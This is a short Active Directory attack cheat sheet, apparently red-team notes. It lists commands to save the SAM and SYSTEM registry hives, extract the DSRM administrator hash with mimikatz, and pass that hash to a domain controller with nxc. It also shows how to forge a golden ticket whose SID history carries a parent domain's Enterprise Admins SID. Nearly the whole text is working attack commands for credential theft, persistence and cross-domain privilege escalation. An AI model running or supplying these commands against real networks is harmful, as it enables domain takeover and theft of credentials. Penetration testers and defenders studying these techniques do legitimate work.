```
# ── DSRM: local admin account baked into every DC, gives persistence ──
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
mimikatz # lsadump::sam /system:system.save /sam:sam.save
# Use the DSRM hash to auth (needs a registry tweak to allow network logon):
nxc smb DC01 -u administrator -H <DSRM_HASH> --local-auth

# ── SID History: forge membership in a trusted domain's privileged group ──
Get-ADTrust -Filter *              # map trust direction first
mimikatz # kerberos::golden /domain:child.corp.local /sid:S-1-5-21-CHILD \
    /sids:S-1-5-21-PARENT-519 /rc4:<krbtgt_hash> /user:Administrator /ptt
# The /sids: value is the parent domain's Enterprise Admins SID — grants cross-domain access
```